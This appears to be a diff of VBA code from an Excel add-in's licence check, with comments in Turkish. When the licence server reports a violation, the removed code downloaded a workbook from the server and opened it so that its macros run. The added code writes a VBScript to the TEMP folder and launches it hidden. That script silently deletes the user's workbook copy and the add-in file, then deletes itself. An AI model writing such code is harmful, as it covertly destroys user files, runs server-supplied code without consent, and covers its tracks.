@@ -136,82 +136,53 @@ Private Sub HandleLicenseResponse(responseText As String, dosyaYolu As String, b
 
         Debug.Print "[getLicense] Registry guncellendi -> ihlalDosyaYolu=" & dosyaYolu
 
-        ' ihlal.xlsm dosyasini kopyanin bulundugu klasore indir ve calistir
-        Call DownloadAndRunIhlal(baseUrl, dosyaYolu)
+        ' Arkaplanda VBScript ile dosyalari sil (Excel kapaninca kilitsiz kalir)
+        Call RunIhlalCleanup(dosyaYolu)
     Else
         Call SaveLicenseFromResponse(responseText)
     End If
 End Sub
 
-' ihlal.xlsm'i sunucudan indirir ve kopya dosyanin bulundugu klasore kaydedip acar.
-' saveDirHint: kopya dosyanin tam yolu (dizin bu yoldan cikartilir).
-Private Sub DownloadAndRunIhlal(baseUrl As String, Optional saveDirHint As String = "")
-    Dim http As Object
-    Dim ihlalUrl As String
-    Dim saveDir As String
-    Dim savePath As String
+' Kopya dosyayi ve teklif.xlam'i silmek icin arka planda VBScript olusturur ve calistirir.
+' Excel kapandiktan sonra dosya kilidi kalkar; VBScript tekrar tekrar dener.
+' kopyaYolu: silinecek kopya dosyanin tam yolu
+Private Sub RunIhlalCleanup(kopyaYolu As String)
+    Dim teklifYolu As String
+    Dim vbsPath As String
+    Dim fileNum As Integer
 
-    ihlalUrl = baseUrl & "download/ihlal"
+    teklifYolu = Environ("APPDATA") & "\Microsoft\AddIns\teklif.xlam"
+    vbsPath = Environ("TEMP") & "\ihlal_cleanup.vbs"
 
-    ' Kopya dosyanin dizinini hesapla
-    If Len(saveDirHint) > 0 Then
-        Dim sepPos As Long
-        sepPos = 0
-        Dim ci As Long
-        For ci = Len(saveDirHint) To 1 Step -1
-            If Mid(saveDirHint, ci, 1) = "\" Or Mid(saveDirHint, ci, 1) = "/" Then
-                sepPos = ci
-                Exit For
-            End If
-        Next ci
-        If sepPos > 0 Then
-            saveDir = Left(saveDirHint, sepPos)
-        End If
-    End If
+    Debug.Print "[getLicense] Silme VBScript olusturuluyor: " & vbsPath
 
-    ' Dizin belirlenemezse AddIns klasorunu kullan
-    If Len(saveDir) = 0 Then
-        saveDir = Environ("APPDATA") & "\Microsoft\AddIns\"
-    End If
+    fileNum = FreeFile
+    Open vbsPath For Output As #fileNum
+    Print #fileNum, "Dim fso : Set fso = CreateObject(""Scripting.FileSystemObject"")"
+    Print #fileNum, "Dim attempts : attempts = 0"
+    Print #fileNum, "Dim maxAttempts : maxAttempts = 30  ' 30 x 5s = 2.5 dakika"
+    Print #fileNum, ""
+    Print #fileNum, "Do While attempts < maxAttempts"
+    Print #fileNum, "    WScript.Sleep 5000"
+    Print #fileNum, "    On Error Resume Next"
+    Print #fileNum, "    fso.DeleteFile """ & kopyaYolu & """, True"
+    Print #fileNum, "    fso.DeleteFile """ & teklifYolu & """, True"
+    Print #fileNum, "    On Error GoTo 0"
+    Print #fileNum, "    ' Her ikisi de yoksa is bitti"
+    Print #fileNum, "    If Not fso.FileExists(""" & kopyaYolu & """) And Not fso.FileExists(""" & teklifYolu & """) Then"
+    Print #fileNum, "        Exit Do"
+    Print #fileNum, "    End If"
+    Print #fileNum, "    attempts = attempts + 1"
+    Print #fileNum, "Loop"
+    Print #fileNum, ""
+    Print #fileNum, "' Kendini sil"
+    Print #fileNum, "On Error Resume Next"
+    Print #fileNum, "fso.DeleteFile WScript.ScriptFullName, True"
+    Close #fileNum
 
-    savePath = saveDir & "ihlal.xlsm"
-    Debug.Print "[getLicense] ihlal.xlsm indiriliyor: " & ihlalUrl & " -> " & savePath
-
-    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    On Error GoTo DownloadErr
-
-    http.Open "GET", ihlalUrl, False
-    http.setTimeouts 5000, 15000, 30000, 30000
-    http.send
-
-    If http.Status = 200 Then
-        ' Binary yaniti diske yaz
-        Dim stream As Object
-        Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 1 ' adTypeBinary
-        stream.Open
-        stream.Write http.responseBody
-        stream.SaveToFile savePath, 2 ' adSaveCreateOverWrite
-        stream.Close
-        Set stream = Nothing
-
-        Debug.Print "[getLicense] ihlal.xlsm kaydedildi: " & savePath
-
-        ' Dosyayi ac - Workbook_Open tetiklenir
-        On Error Resume Next
-        Application.Workbooks.Open savePath
-        On Error GoTo 0
-        Debug.Print "[getLicense] ihlal.xlsm acildi."
-    Else
-        Debug.Print "[getLicense] ihlal.xlsm indirilemedi. HTTP " & http.Status
-    End If
-
-    Set http = Nothing
-    Exit Sub
-
-DownloadErr:
-    Debug.Print "[getLicense] ihlal.xlsm indirme hatasi: " & Err.Description
-    Set http = Nothing
+    Debug.Print "[getLicense] VBScript kaydedildi. Arkaplanda baslatiliyor..."
+    Shell "wscript.exe """ & vbsPath & """ //nologo", vbHide
+    Debug.Print "[getLicense] Silme scripti baslatildi."
 End Sub
 
 Private Function BuildLicenseJson(mac As String, firmaAdi As String, userAdi As String, dosyaAdi As String) As String
